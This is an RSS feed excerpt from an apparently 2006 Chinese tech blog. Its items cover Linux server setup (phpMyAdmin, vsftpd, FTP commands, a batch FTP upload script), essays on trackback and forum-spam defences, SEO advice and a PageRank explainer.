rpm -qa | grep zlib rpm -qa | grep libpng rpm -qa | grep freetype rpm -qa | grep jpeg rpm -qa | grep gd 如果没有安装的话，可以按照下面的步骤手动安装： QUOTE: (1) 安装zlib
tar zxvf zlib-1.2.2.tar.gz cd zlib-1.2.2 ./configure make make install (2) 安装libpng</description>
    </item>
    
    <item>
      <title>phpMyAdmin 2.8.0.3 安装配置</title>
      <link>http://example.org/2006/04/22/phpmyadmin-2803-e5ae89e8a385e9858de7bdae/</link>
      <pubDate>Sat, 22 Apr 2006 21:38:29 +0000</pubDate>
      
      <guid>http://example.org/2006/04/22/phpmyadmin-2803-e5ae89e8a385e9858de7bdae/</guid>
      <description>装好新的服务器要装pma 看别人都用这个版本了也装个试试吧
找开一看和以前的有点不一样
config.inc.php
这个文件没了
看了一下安装说明才知道
要把./libraries/config.default.php 复制到phpMyAdmin根目录并重命名为config.inc.php
才可以
配置如下
$cfg[&amp;lsquo;PmaAbsoluteUri&amp;rsquo;] = &amp;lsquo;http://www.yourdomain.com/phpMyAdmin&#39;; （写出访问phpMyAdmin的绝对URL）／／其实绑了多个不填也可以的
$cfg[&amp;lsquo;blowfish_secret&amp;rsquo;] = &amp;lsquo;cookie&amp;rsquo;; （使用cookie加密）
$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;connect_type&amp;rsquo;] = &amp;lsquo;socket&amp;rsquo;; （以socket方式连接MySQL）
$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;compress&amp;rsquo;] = TRUE; （启用压缩以提高速度，如果访问不正常请改回FALSE）
$cfg[&amp;lsquo;Servers&amp;rsquo;][$i][&amp;lsquo;auth_type&amp;rsquo;] = &amp;lsquo;cookie&amp;rsquo;; （使用cookie进行身份验证）
在linux下要设置文件755
要不然可能不能运行
还有就是运行安装程序，看了一下麻烦的很
在浏览器中运行http://&amp;hellip;./phpMyAdmin/libraries/dbg/setup.php 以向导模式进行安装</description>
    </item>
    
    <item>
      <title>文件权限</title>
      <link>http://example.org/2006/04/20/e69687e4bbb6e69d83e99990/</link>
      <pubDate>Thu, 20 Apr 2006 16:40:08 +0000</pubDate>
      
      <guid>http://example.org/2006/04/20/e69687e4bbb6e69d83e99990/</guid>
      <description>检查　ls -laZ　文件或目录
改变 chcon -t httpd_sys_content_t 文件或目录</description>
    </item>
    
    <item>
      <title>FTP命令详解</title>
      <link>http://example.org/2006/04/17/ftpe591bde4bba4e8afa6e8a7a3/</link>
      <pubDate>Mon, 17 Apr 2006 05:58:08 +0000</pubDate>
      
      <guid>http://example.org/2006/04/17/ftpe591bde4bba4e8afa6e8a7a3/</guid>
      <description>FTP命令是Internet用户使用最频繁的命令之一，不论是在DOS还是UNIX操 作系统下使用FTP，都会遇到大量的FTP内部命令。 熟悉并灵活应用FTP的内部 命令，可以大大方便使用者，并收到事半功倍之效。 FTP的命令行格式为： ftp -v -d -i -n -g [主机名] ，其中 -v 显示远程服务器的所有响应信息； -n 限制ftp的自动登录，即不使用； .n etrc文件； -d 使用调试方式； -g 取消全局文件名。
ftp使用的内部命令如下(中括号表示可选项):
1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如： !ls*.zip.
2.$ macro-ame[args]：执行宏定义macro-name.
3.account[password]：提供登录远程系统成功后访问系统资源所需的补 充口令。
4.append local-file[remote-file]：将本地文件追加到远程系统主机， 若未指定远程系统文件名，则使用本地文件名。
5.ascii：使用ascii类型传输方式。
6.bell：每个命令执行完毕后计算机响铃一次。
7.bin：使用二进制文件传输方式。
8.bye：退出ftp会话过程。
9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。
10.cd remote-dir：进入远程主机目录。
11.cdup：进入远程主机目录的父目录。
12.chmod mode file-name：将远程主机文件file-name的存取方式设置为 mode，如： chmod 777 a.out 。
13.close：中断与远程服务器的ftp会话(与open对应)。
14.cr：使用asscii方式传输文件时，将回车换行转换为回行。
15.delete remote-file：删除远程主机文件。
16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命 令，如： deb up 3，若设为0，表示取消debug。
17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本 地文件local-file。
18.disconnection：同close。
19.form format：将文件传输方式设置为format，缺省为file方式。
20.get remote-file[local-file]： 将远程主机的文件remote-file传至 本地硬盘的local-file。
21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名， 同命令行的-g参数。</description>
    </item>
    
    <item>
      <title>一个完整的ftp远程批量shell</title>
      <link>http://example.org/2006/04/17/e4b880e4b8aae5ae8ce695b4e79a84ftpe8bf9ce7a88be689b9e9878fshell-2/</link>
      <pubDate>Mon, 17 Apr 2006 05:55:03 +0000</pubDate>
      
      <guid>http://example.org/2006/04/17/e4b880e4b8aae5ae8ce695b4e79a84ftpe8bf9ce7a88be689b9e9878fshell-2/</guid>
      <description>单位有30多台远程主机须不定期升级程序，为了方便传送文件，整理如下FTP批量处理程式，主文件为main.sh内容格式固定，调用程序autopro.sh文件可根据传送文件及目录随时更改 main.sh文件内容如下：
hostlist=&#39;198.1.1.1 198.1.1.2 198.1.1.3 .......................&#39; ＃有多少主机IP，就一起写上吧！ echo echo &amp;quot;-----远程FTP批量数据传送------&amp;quot; echo -n &amp;quot;\n 请输入登录用户名:&amp;quot;;read username echo -n &amp;quot; 请输入用户口令 :&amp;quot; stty -echo　＃将输入的口令隐起来 read userpwd stty echo echo &amp;quot;\n 发往以下主机：[用户名:$username]&amp;quot; echo &amp;quot; $hostlist&amp;quot; echo &amp;quot;\n 开始传送程序，按回车键开始 ..........&amp;quot; read goenter for host in $hostlist ＃所有主机IP循环语句 do echo &amp;quot;正在向服务器　$host 正在传送数据 ..........&amp;quot; sh autopro.sh $host $username $userpwd #参数一为主机IP，参数二为用户名，参数三为口令 echo &amp;quot;服务器　$host 传送数据完成!!&amp;quot; echo &amp;quot;OK&amp;quot; sleep 2 done echo &amp;quot;\n全部数据传送完毕\n&amp;quot; autopro.sh　文件内容如下： ftp -niv $1 &amp;lt; </description>
    </item>
    
    <item>
      <title>一个完整的ftp远程批量shell</title>
      <link>http://example.org/2006/04/17/e4b880e4b8aae5ae8ce695b4e79a84ftpe8bf9ce7a88be689b9e9878fshell/</link>
      <pubDate>Mon, 17 Apr 2006 05:54:34 +0000</pubDate>
      
      <guid>http://example.org/2006/04/17/e4b880e4b8aae5ae8ce695b4e79a84ftpe8bf9ce7a88be689b9e9878fshell/</guid>
      <description>单位有30多台远程主机须不定期升级程序，为了方便传送文件，整理如下FTP批量处理程式，主文件为main.sh内容格式固定，调用程序autopro.sh文件可根据传送文件及目录随时更改 main.sh文件内容如下：
hostlist=&amp;lsquo;198.1.1.1 198.1.1.2 198.1.1.3 &amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;&amp;hellip;..&amp;rsquo; ＃有多少主机IP，就一起写上吧！ echo echo &amp;ldquo;&amp;mdash;&amp;ndash;远程FTP批量数据传送&amp;mdash;&amp;mdash;&amp;rdquo; echo -n &amp;ldquo;\n 请输入登录用户名:&amp;quot;;read username echo -n &amp;quot; 请输入用户口令 :&amp;rdquo; stty -echo　＃将输入的口令隐起来 read userpwd stty echo echo &amp;ldquo;\n 发往以下主机：[用户名:$username]&amp;rdquo; echo &amp;quot; $hostlist&amp;quot; echo &amp;ldquo;\n 开始传送程序，按回车键开始 &amp;hellip;&amp;hellip;&amp;hellip;.&amp;rdquo; read goenter
for host in $hostlist ＃所有主机IP循环语句 do echo &amp;ldquo;正在向服务器　$host 正在传送数据 &amp;hellip;&amp;hellip;&amp;hellip;.&amp;rdquo; sh autopro.sh $host $username $userpwd #参数一为主机IP，参数二为用户名，参数三为口令 echo &amp;ldquo;服务器　$host 传送数据完成!!&amp;rdquo; echo &amp;ldquo;OK&amp;rdquo; sleep 2 done echo &amp;ldquo;\n全部数据传送完毕\n&amp;rdquo;
autopro.sh　文件内容如下：
ftp -niv $1 &amp;lt;</description>
    </item>
    
    <item>
      <title>VSFTP＋MySQL虚拟用户配置</title>
      <link>http://example.org/2006/04/17/vsftpefbc8bmysqle8999ae68b9fe794a8e688b7e9858de7bdae/</link>
      <pubDate>Mon, 17 Apr 2006 02:42:42 +0000</pubDate>
      
      <guid>http://example.org/2006/04/17/vsftpefbc8bmysqle8999ae68b9fe794a8e688b7e9858de7bdae/</guid>
      <description>VSFTPD是一种在UNIX/Linux中非常安全且快速的FTP服务器，目前已经被许多大型站点所采用。VSFTPD支持将用户名和口令保存在数据库文件或数据库服务器中。VSFTPD称这种形式的用户为虚拟用户。相对于FTP的本地（系统）用户来说，虚拟用户只是FTP服务器的专有用户，虚拟用户只能访问FTP服务器所提供的资源，这大大增强系统本身的安全性。相对于匿名用户而言，虚拟用户需要用户名和密码才能获取FTP服务器中的文件，增加了对用户和下载的可管理性。对于需要提供下载服务，但又不希望所有人都可以匿名下载；既需要对下载用户进行管理，又考虑到主机安全和管理方便的FTP站点来说，虚拟用户是一种极好的解决方案。本文介绍在RedHat Linux 9上如何将VSFTPD的虚拟用户名和密码保存在MySQL数据库服务器中。
一、VSFTPD的安装
目前，VSFTPD的最新版本是1.2.0版。官方下载地址为ftp://vsftpd.beasts.org/users/cevans/vsftpd-1.2.0.tar.gz。在安装前，需要先做以下准备工作：
VSFTPD默认配置中需要“nobody”用户。在系统中添加此用户，如果用户已经存在，useradd命令有相应提示。 [root@hpe45 root]# useradd nobody useradd: user nobody exists
VSFTPD默认配置中需要“/usr/share/empty”目录。在系统中此目录，如果目录已经存在，mkdir命令有相应提示。 [root@hpe45 root]# mkdir /usr/share/empty/ mkdir: cannot create directory &amp;lsquo;/usr/share/empty&amp;rsquo;: File exists
VSFTPD提供匿名FTP服务时，需要“ftp”用户和一个有效的匿名目录。 [root@hpe45 root]# mkdir /var/ftp/ [root@hpe45 root]# useradd -d /var/ftp ftp 接下来的操作对于ftp用户是否已经存在都是有用的。 [root@hpe45 root]# chown root.root /var/ftp [root@hpe45 root]# chmod og-w /var/ftp
以上准备工作完成后，我们就可以开始编译源代码了。假定我们下载的vsftpd-1.2.0.tar.gz在/root目录，执行以下命令： [root@hpe45 root]# tar zxvf vsftpd-1.2.0.tar.gz [root@hpe45 root]# cd vsftpd-1.2.0 [root@hpe45 vsftpd-1.2.0]# make [root@hpe45 vsftpd-1.2.0]# make install
上面的“make install”命令将编译好的二进制文件、手册等复制到相应目录。在RHL9上，可能需要手动执行以下复制： [root@hpe45 vsftpd-1.2.0]# cp vsftpd /usr/local/sbin/vsftpd [root@hpe45 vsftpd-1.</description>
    </item>
    
    <item>
      <title>vsftp配置大全</title>
      <link>http://example.org/2006/04/17/vsftpe9858de7bdaee5a4a7e585a8-e8b685e5ae8ce695b4e78988/</link>
      <pubDate>Mon, 17 Apr 2006 02:25:27 +0000</pubDate>
      
      <guid>http://example.org/2006/04/17/vsftpe9858de7bdaee5a4a7e585a8-e8b685e5ae8ce695b4e78988/</guid>
      <description>超完整版 wordpress_id: 56 categories:
&amp;ldquo;\n技术文章\n &amp;quot; 如果不做说明，一般安装命令均使用ROOT权限，用 # 表示
特别说明：无
以下文章介绍Liunx 环境下vsftpd的三种实现方法
一、前言 Vsftp(Very Secure FTP)是一种在Unix/Linux中非常安全且快速稳定的FTP服务器，目前已经被许多大型站点所采用，如ftp.redhat.com,ftp.kde.org,ftp.gnome.org.等。Vsftpd的实现有三种方式 1、匿名用户形式：在默认安装的情况下，系统只提供匿名用户访问 2、本地用户形式：以/etc/passwd中的用户名为认证方式 3、虚拟用户形式：支持将用户名和口令保存在数据库文件或数据库服务器中。相对于FTP的本地用户形式来说，虚拟用户只是FTP服务器的专有用户，虚拟用户只能访问FTP服务器所提供的资源，这大大增强系统本身的安全性。相对于匿名用户而言，虚拟用户需要用户名和密码才能获取FTP服务器中的文件，增加了对用户和下载的可管理性。对于需要提供下载服务，但又不希望所有人都可以匿名下载；既需要对下载用户进行管理，又考虑到主机安全和管理方便的 FTP站点来说，虚拟用户是一种极好的解决方案。
二、获取最新版的Vsftp程序 Vsftp官方下载：[url=ftp://vsftpd.beasts.org/users/cevans/vsftpd- 2.0.3.tar.gz]ftp://vsftpd.beasts.org/users/cevans/vsftpd-2.0.3.tar.gz，目前已经到2.0.3版本。假设我们已经将vsftpd-2.0.3.tar.gz文件下载到服务器的/home/xuchen目录
cd /home/xuchen tar xzvf vsftpd-2.0.3.tar.gz //解压缩程序 cd vsftpd-2.0.3 初学vb 回复于：2005-06-13 13:30:17
三、三种方式的实现 1、匿名用户形式实现
vi builddefs.h \编辑builddefs.h 文件，文件内容如下： #ifndef VSF_BUILDDEFS_H
#define VSF_BUILDDEFS_H #undef VSF_BUILD_TCPWRAPPERS #define VSF_BUILD_PAM #undef VSF_BUILD_SSL
#endif /* VSF_BUILDDEFS_H */ 将以上undef的都改为define，支持tcp_wrappers，支持PAM认证方式，支持SSL
make //直接在vsftpd-2.0.3里用make编译 ls -l vsftpd -rwxr-xr-x 1 root root 86088 Jun 6 12:29 vsftpd //可执行程序已被编译成功</description>
    </item>
    
    <item>
      <title>trackback 有罪</title>
      <link>http://example.org/2006/04/15/trackback-e69c89e7bdaa/</link>
      <pubDate>Sat, 15 Apr 2006 21:43:46 +0000</pubDate>
      
      <guid>http://example.org/2006/04/15/trackback-e69c89e7bdaa/</guid>
      <description>作者: sadly 出自: http://www.phpx.com
昨天 4ngle 找俺 要俺帮他测试一下trackback防spam的功能：（ 好无聊，原来的那些js早没了，随便套了一个php的httpclient类库给他写了一个， 发现他的程序效果还是不错的。
我不晓得机制是什么样，我再说一点点。 trackback 和 comment 是不有同的，对吗？ 往下看～
不知到有没有人考虑过，trackback应该从哪里发出来？ 如果我在一篇blog里引用了你的文章，要对你发出trackback， 那么通常向你的服务器发trackback的应该是我的BSP的服务器， 它的ip地址和trackback里面url的ip地址应该是有一致性的吧？
如果有一个trackback发出的 ip 地址是 202.108.1.1 , url是 www.abc.com/blog/1.html 但 www.abc.com 的ip地址是 203.121.1.1 那很显然，它大概是伪造的。
如果你在用一个很大的BSP，那么不排除这种可能性， username0.bsp.com的ip地址是 202.108.1.1 username3.bsp.com的ip地址是 202.108.1.2 username5.bsp.com的ip地址是 202.108.1.3 而系统发trackback的时候使用的是 202.108.1.5 ，因为大的集群里由于负载均衡等等的需要可能 会存在这种分工，进出的ip不一样，但是他们的差异会有多大呢？
多动脑子，少动嘴：） trackback 没有罪， 开放也没有罪， 但是不爱思考的程序员有罪。
刚刚在dreamhost测试了一下～ www..com 的ip地址是 64.111××× 而 www..name 的ip地址是 208.××× 用同样的wordpress程序测试，得到的服务器出口的ip是 64.111.*** ，还好，出口的ip是一致的。
如果改用白名单来控制哪些BSP / IP地址是可信的，那效果估计比过滤关键词，ip，网址之类的要 轻松不少吧， 还有上次说过那个问题 §时间§</description>
    </item>
    
    <item>
      <title>从trackback说起</title>
      <link>http://example.org/2006/04/15/e4bb8etrackbacke8afb4e8b5b7/</link>
      <pubDate>Sat, 15 Apr 2006 21:36:58 +0000</pubDate>
      
      <guid>http://example.org/2006/04/15/e4bb8etrackbacke8afb4e8b5b7/</guid>
      <description>作者: sadly 出自: http://www.phpx.com
前两天在网上逛的时候看到了关于blog里trackback的资料,发现它在设计上是有隐患的, 后来还给某几个知名的网站发了点纪念品, 惹得人家直说我早就知到了,不过这关你屁事. 我对口水战没有什么兴趣. 在此说一点程序设计中我个人认为应该考虑的问题,希望 能够抛砖引玉一下.
1 连续的数字id 使用数字id来标识一篇资料,比如blog的文章, 这当然最简单,最容易实现的. 因为我们设计 数据库的时候通常都会加一个自增长的id来做唯一标志. 用id来标识很直接, 也不需要 额外的存储空间. 不过这显然不是一个很安全的方式, 象村子用的DZ这个程序 viewthread.php?tid=文章编号 是看帖子.只要跑一个循环就可以把全部的文章都抓到了.被 人抓站当然是难免了,但要是被人乱发帖恐怕就不那么舒服了.
大家都知道数据库对读是有优化的, 而对于写所能做的事情则很有限. 想一想, 如果有个 程序不停的发帖, 数据库记录疯涨 ,数据不断更新, 那你设计的静态化之类的恐怕是没 什么效果了.
假如, 我们在数据库里加一个字段 ukey , 设计为唯一的标志, 数据取个随机数好了 当然最好是字母数字混和的长字符串. 现在用 (for $i=起始id;$i&amp;lt;终止id;$i++) 回复第$i个文章 的办法显然是不行了.
不过还是有办法的. 它可以先抓列表页,然后分析出每个文章的ukey, 之后 再 (for $i=起始值;$i&amp;lt;要发送的数量;$i++) 回复第$all_ukey_array[$i]个文章.
于是, 我们在回帖的时候给每个文章加上不同的随机识别码. 好了. 现在它只好先抓到 列表页, 然后再抓具体页面并分析出这个文章对应的识别码. 最后 再 ($i=起始值;$i&amp;lt;要发送的数量;$i++) 用识别码$all_seccode_array[$i] 回复第$all_ukey_array[$i]个文章
看来还是没有解决, 图形验证码浮出了水面, 它确实够安全, 可是图形验证码对于正常使 用的用户是不够友好的, 如果每次发帖都要输一个讨厌的验证码那用户就没什么兴趣了.
算了,还是放弃它, 用户看一篇文章会看多久然后回复它呢?</description>
    </item>
    
    <item>
      <title>把握网站在搜索引擎中的资源</title>
      <link>http://example.org/2006/04/15/e68a8ae68fa1e7bd91e7ab99e59ca8e6909ce7b4a2e5bc95e6938ee4b8ade79a84e8b584e6ba90/</link>
      <pubDate>Sat, 15 Apr 2006 18:11:42 +0000</pubDate>
      
      <guid>http://example.org/2006/04/15/e68a8ae68fa1e7bd91e7ab99e59ca8e6909ce7b4a2e5bc95e6938ee4b8ade79a84e8b584e6ba90/</guid>
      <description>很多网站管理者每天只知道分析网站的流量，这样的工作对于提升自己的网站的流量来说是很不足够的。
现在随着网站数量的剧增，搜索引擎的作用也就越来越引起重视了，我觉得有必要告诉大家的是，从搜索引擎引入的流量才是你网站的稳定的核心流量，因此我们有必要研究搜索引擎。
记住这么一个原则，你在搜索引擎中搜索结果的排名是和通过此结果进入你网站的访问者的数量成正比的。这里我给大家说出这么一个经验说法，在搜索结果中排名为前10位的网站大约能够截走百分之六十的流量，排名为11-20的网站大约能截走百分之三十的流量，那么剩下的网站就在分享剩余的流量了。
在这里我给大家提出这么一个概念-搜索引擎刷新频率。什么是搜索引擎刷新频率？也就是你的网站信息被搜索引擎蜘蛛捕捉的频率很高，从而搜索引擎给你的网站很快刷新，这个刷新频率也即是搜索引擎刷新频率。搜索引擎刷新频率在搜索引擎结果里并没有直观得表现出来的，这个需要我们认为的去分析，怎么去分析呢？其实很简单，每个搜索引擎结果后面都跟了一个日期，大家在一段时间里只需要跟踪这个日期数据就可以了，看看这个日期是不是每天连续的和持续的发生变化就可以了，如果是每天都会变化，那就说明网站的搜索引擎刷新频率很高。
网站的搜索引擎刷新频率很高，这会给你的网站在搜索引擎结果里的排名带来很大的优势的，说直白一点就是它能提升你的网站在搜索引擎里的排名。
当然也有很多站长已经注意到了这个问题了，但是我发现他们的做法很有局限。很多人只是一味地在关注网站首页的刷新频率，其实在他的很多站点里其他的页面的刷新频率要比首页快得多。
所以这里我要提出我的一个观点，研究网站在搜索引擎中的形势，要基于一种从整体的角度出发想法，片面的热衷于首页可行度会有很大的折扣的。
怎么样来观察整个网站在搜索引擎中的刷新频率？
使用一个命令：site:网站域名（最好是去掉WWW）譬如： site:youdoman.com
然后你可以在搜索结果中看到搜索引擎已经收录你的网站的页面的最后依次更新日期，然后花上一段时间跟踪这些数据，看看有那些页面的刷新频率更快。
如何利用这些刷新频率快的页面？ 请不要盗链,内容来自www.chinahtml.com ,打造中国站长技术乐园 你网站中的刷新频率较快的页面对于各位站长来说是很重要的资源，只是大家都没有重视而已，那么下面我就来告诉大家，怎么去有效地去利用这些资源。搜索引擎之所以能自动抓取数量巨多的网页就是通过超级连接来实现的，刷新频率较高的网页是很受搜索引擎重视的，所以它上面的一些连接信息是很容易被搜索引擎抓取的。 中国站长资讯网,中国站长第一门户 1、均衡网站整体刷新频率
其实我们可以通过在刷新频率较快的页面上来有目的布入其他刷新不是很快的页面的连接，这样可以通过刷新频率快的页面带动刷新频率不是很快的页面刷新频率，这样有助于整体提高网站的刷新频率，从而有效提升网站的页面在搜索引擎结果中的排名，当然这样良性循环造成的一个结果就是-你网站的访问量会增加！
2、加强其他网站的搜索引擎登陆效果 中国站长资讯网,中国站长第一门户 我想很多人都不止拥有一个网站，但是有一个问题都很困惑他们，为什么有的网站能快速进入搜索引擎，但是有的却进入速度很慢？很多人采用的是从搜索引擎提供的入口登陆，一般来说登陆效果不是很明显。其实搜索引擎已经给大家提供了一个很明显的说明，去寻求友情连接吧。我的建议是，与其从搜索引擎提供的登陆入口登陆，还不如让一些在搜索引擎里刷新频率快的页面给你的其他网站做个连接！
看了这篇文章有所收益么？赶紧行动吧，去发现并有效利用你网站在搜索引擎中既有的但是还未曾被你注意的资源吧</description>
    </item>
    
    <item>
      <title>中文搜索引擎技术揭密：排序技术</title>
      <link>http://example.org/2006/04/15/e4b8ade69687e6909ce7b4a2e5bc95e6938ee68a80e69cafe68fade5af86efbc9ae68e92e5ba8fe68a80e69caf/</link>
      <pubDate>Sat, 15 Apr 2006 18:10:35 +0000</pubDate>
      
      <guid>http://example.org/2006/04/15/e4b8ade69687e6909ce7b4a2e5bc95e6938ee68a80e69cafe68fade5af86efbc9ae68e92e5ba8fe68a80e69caf/</guid>
      <description>随着“眼球经济”席卷互联网，成千上万的资金迅速流向最能吸引浏览着眼球的搜索引擎市场。有大量调查显示搜索引擎市场正处在高速发展时期，成为了未来几年内最具发展潜力的产业之一。随着Google、百度、中国搜索等各具特色的搜索引擎逐渐成为人们最常用的网络工具，企业对搜索引擎的注意力也从“观察”升级为“动武”。 随着市场容量和使用者人数的不断激增，如何完善搜索功能使之更加公平、公开、标准和人性化也就随之成为了一个备受关注的话题。但是有一个矛盾体在这其中不断的显现出来：收费可以为搜索引擎公司带来利润，但同时会降低访问者的体验满意度。如何权衡金钱和用户需求之间的天平呢？ Google成功的秘密 到2004年为止，Google（http://www.google.com）已经连续两年被评为全球第一品牌，Google成立仅五年时间，最初只是两个斯坦福大学学生的研究项目。这不能不说是一个奇迹，就像比尔•盖茨创制奇迹一样。比尔•盖茨能创造奇迹，是因为他看准了个人计算机软件市场的趋势，所以创建的公司叫Microsoft（微软）：Micro（小）Soft（软件）。那么Google呢？在 Google出来之前已经有一些很有成就的搜索引擎公司，其实力也很强，看来不只是Google看见了搜索的趋势。Google究竟成功的秘密在哪儿？ Google 的成功有许多因素，最重要的是Google对搜索结果的排序比其它搜索引擎都要好。Google保证让绝大部分用搜索的人，都能在搜索结果的第一页找到他想要的结果。客户得到了满足，下一次还过来，而且会向其他人介绍，这一来一往，使用的人就多了。所以Google在没有做任何广告的前提下，让自己成为了全球最大的品牌。Google究竟采用了哪种排序技术？PageRank，即网页级别。 Google有一个创始人叫Larry Page，据说PageRank的专利是他申请的，于是依据他的名字就有了Page Rank。国内也有一家很成功的搜索引擎公司，叫百度（http://www.baidu.com）。百度的创始人李彦宏说，早在1996年他就申请了名为超链分析的专利，PageRank的原理和超链分析的原理是一样的，而且PageRank目前还在Paten-pending（专利申请中）。言下之意是这里面存在专利所有权的问题。这里不讨论专利所有权，只是从中可看出，成功搜索引擎的排序技术，就其原理上来说都差不多，那就是链接分析。超链分析和 PageRank都属于链接分析。 链接分析到底为何物？由于李彦宏的超链分析没有具体的介绍，笔者唯一看过的就是在美国专利局网站上关于李彦宏的专利介绍。PageRank的介绍倒是不少，而且目前Google毕竟是全球最大的搜索引擎，这里以PageRank为代表，详细介绍链接分析的原理。 PageRank揭密 PageRank 的原理类似于科技论文中的引用机制：谁的论文被引用次数多，谁就是权威。说的更白话一点：张三在谈话中提到了张曼玉，李四在谈话中也提到张曼玉，王五在谈话中还提到张曼玉，这就说明张曼玉一定是很有名的人。在互联网上，链接就相当于“引用”，在B网页中链接了A，相当于B在谈话时提到了A，如果在C、D、 E、F中都链接了A，那么说明A网页是最重要的，A网页的PageRank值也就最高。 如何计算PageRank值有一个简单的公式： 其中：系数为一个大于0，小于1的数。一般设置为0.85。网页1、网页2至网页N表示所有链接指向A的网页。 由以上公式可以看出三点： 1、链接指向A的网页越多，A的级别越高。即A的级别和指向A的网页个数成正比，在公式中表示，N越大， A的级别越高； 2、链接指向A的网页，其网页级别越高， A的级别也越高。即A的级别和指向A的网页自己的网页级别成正比，在公式中表示，网页N级别越高， A的级别也越高； 3、链接指向A的网页，其链出的个数越多，A的级别越低。即A的级别和指向A的网页自己的网页链出个数成反比，在公式中现实，网页N链出个数越多，A的级别越低。 每个网页有一个PageRank值，这样形成一个巨大的方程组，对这个方程组求解，就能得到每个网页的PageRank值。互联网上有上百亿个网页，那么这个方程组就有上百亿个未知数，这个方程虽然是有解，但计算毕竟太复杂了，不可能把这所有的页面放在一起去求解的。对具体的计算方法有兴趣的朋友可以去参考一些数值计算方面的书。 总之，PageRank有效地利用了互联网所拥有的庞大链接构造的特性。从网页A导向网页B的链接，用Google创始人的话讲，是页面A对页面B的支持投票，Google根据这个投票数来判断页面的重要性，但Google除了看投票数（链接数）以外，对投票者（链接的页面）也进行分析。「重要性」高的页面所投的票的评价会更高，因为接受这个投票页面会被理解为「重要的物品」。从新浪、雅虎、微软的首页都有我网页的三个链接的话，可能比我在其他网站找三十个链接还强。如果还有人不理解这个原理，就去想想有句成语叫：三人成虎。如果有三个人都说北京大街上有老虎，那么许多人会认为有老虎，如果这三个人都是国家领导人的话，那么所有人都会认为北京大街上有老虎。 每个网页都会有PageRank值，如果大家想知道自己网站的网页PageRank值是多少，最简单的办法就是下载一个Google的免费工具栏（http://toolbar.google.com/）， 每当你打开一个网页，都可以很清楚的看见此网页的PageRank值。当然这个值是一个大概数字。 据Google技术负责人介绍，Google除了用PageRank衡量网页的重要程度以外，还有其它上百种因素来参与排序。其它搜索引擎也是如此，不可能按照某一种规则来进行搜索结果的排序。 其他方法 HillTop算法： HillTop 同样是一项搜索引擎结果排序的专利，是Google的一个工程师Bharat在2001年获得的专利。Google的排序规则经常在变化，但变化最大的一次也就是基于HillTop算法进行了优化。HillTop究竟原理如何，值得Google如此青睐？ 其实HillTop算法的指导思想和PageRank的是一致的，都是通过网页被链接的数量和质量来确定搜索结果的排序权重。但HillTop认为只计算来自具有相同主题的相关文档链接对于搜索者的价值会更大：即主题相关网页之间的链接对于权重计算的贡献比主题不相关的链接价值要更高。如果网站是介绍“服装”的，有10个链接都是从“服装”相关的网站链接过来，那这10个链接比另外10个从“电器”相关网站链接过来的贡献要大。Bharat称这种对主题有影响的文档为“专家”文档，从这些专家文档页面到目标文档的链接决定了被链接网页“权重得分”的主要部分。 与PageRank结合HillTop算法确定网页与搜索关键词的匹配程度的基本排序过程取代了过份依靠PageRank的值去寻找那些权威页面的方法。这对于两个具有同样主题而且PR相近的网页排序过程中， HillTop算法就显得非常的重要了。HillTop同时也避免了许多想通过增加许多无效链接来提高网页PageRank值的做弊方法。 锚文本（Anchor Text） 锚文本名字听起来难以理解，实际上锚文本就是链接文本。例如，在个人网站上把中央电视台（www.cctv.com）做为新闻频道的链接，访问者通过点击网站上的“新闻频道”就能进入http://www.cctv.com网站，那么“新闻频道”就是中央电视台网站首页的锚文本。 锚文本可以做为锚文本所在的页面的内容的评估。正常来讲，页面中增加的链接都会和页面本身的内容有一定的关系。服装的行业网站上会增加一些同行网站的链接或者一些做服装的知名企业的链接；另一方面，锚文本能做为对所指向页面的评估。锚文本能精确的描述所指向页面的内容，个人网站上增加Google的链接，锚文本为 “搜索引擎”。这样通过锚文本本身就能知道，Google是搜索引擎。 锚文本对搜索引擎起的作用还表现为可以收集一些搜索引擎不能索引的文件。例如，网站上增加了一张张曼玉的照片，格式为jpg文件，搜索引擎目前很难索引（一般只处理文本）。若这张照片链接的锚文本为“张曼玉的照片”，那么搜索引擎就能识别这张图片是张曼玉的照片，以后访问者搜索“张曼玉”的时候，这张图片就能被搜索到。 由此可见，在网页设计中选择合适的锚文本，会让所在网页和所指向网页的重要程度有所提升。 页面版式 每个网页都有版式，包括标题、字体、标签等等。搜索引擎也会利用这些版式来识别搜索词与页面内容的相关程度。以静态的html格式的网页为例，搜索引擎通过网络蜘蛛把网页抓取下来后，需要提取里面的正文内容，过滤其他html代码。在提取内容的时候，搜索引擎就可以记录所有版式信息，包括：哪些词是在标题中出现，哪些词是在正文中出现，哪些词的字体比其他的字体大，哪些词是加粗过，哪些词是用KeyWord标识过的等等。这样在搜索结果中就可以根据这些信息来确定所搜索的结果和搜索词的相关程度。例如搜索“毛泽东”，假如有两个结果，一篇文章标题是《毛泽东的一生》，另一篇文章的标题是《江青的一生》但内容有提到毛泽东，这时搜索引擎会认为前者比较重要，因为“毛泽东”在标题里出现了。 因此，合理的利用网页的页面版式，会提升网页在搜索结果页的排序位置。 收费排名 应该说收费排名并不属于排序技术（这里指的收费排名也包括竞价排名），而是一种搜索引擎的赢利模式。但收费排名已经最直接的影响到了搜索引擎的排序，在此也略做说明。 用户可以购买某个关键词的排名，只要向搜索引擎公司交纳一定的费用，就可以让用户的网站排在搜索结果的前几位，按照不同关键词、不同位置、时间长短来定义价格。价格从几千元到几十万元不等（像“六合彩”在3721上的排名费用大多是几十万）。 收费排名一方面给搜索引擎公司带来收益，一方面给企业带来访问量，另外对访问者也有一定好处。因为访问者想找“西服”，企业想卖“西服”，于是出钱让访问者能找到他，这样，买家和卖家能马上见面。但收费排名给访问者带来更多的却是不真实，结果排序已经失去了公正性，有时候还带来大量垃圾。在百度搜索引擎上搜索“星球”，排在第一位的是一家做石墨的公司，排在第二位的居然是“想找星球？上易趣吧！”（见下图）。真有些让访问者哭笑不得。
